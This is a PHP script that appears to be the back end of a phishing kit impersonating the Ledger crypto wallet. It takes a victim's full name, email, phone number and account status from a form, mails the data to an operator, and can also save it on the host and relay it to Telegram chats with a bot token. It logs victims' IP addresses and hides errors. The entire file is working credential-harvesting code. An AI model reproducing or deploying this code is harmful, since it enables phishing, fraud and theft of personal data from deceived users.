<?php
error_reporting(0);
include 'ledger_page_controlz.php';
include '8GIiHzf3yV/php/inc.php';
if($_POST['fullname'] != '' and $_POST['emailaddress'] != '' and $_POST['phonenumber'] != ''){
	
	$fullname = $_POST['fullname'];
	$emailaddress = $_POST['emailaddress'];
	$phonenumber = $_POST['phonenumber'];

	$subscription = isset($_POST['subscription']) ? 'Yes' : 'No';
	
	
	$data = "+ ------------- New Ledger Info --------------+\n"
	. "+ ------------------------------------------+\n"
	. "+ Result Information\n"
	. "| Full name : $fullname\n"
	. "| Email address : $emailaddress\n"
	. "| Phone number : $phonenumber\n"
	. "| Existing Account? : $subscription\n"
	. "+ ------------------------------------------+";
	
	$headers = "From:ledgerscript";
	$subj = "New Ledger Info [ $ip ]";
	mail($to,$subj,$data,$headers);	
	if($saveonhost == 1){
		$fp = fopen("$saveonhost_filename", "a");
		fputs($fp, "\r\n$data\r\n");
		fclose($fp);
	}
	if($telegram_delivery == 1){
		foreach($chat_ids as $chat_id){
			telegram_deliver($chat_id,$data,$bot_token);
		}
	}
	$fp = fopen("ips/finished_ips.txt", "a");
	fputs($fp, "\r\n$ip\r\n");
	fclose($fp);
	echo '1';
}else{
	die('invalid data please try again');
	exit();
}
?>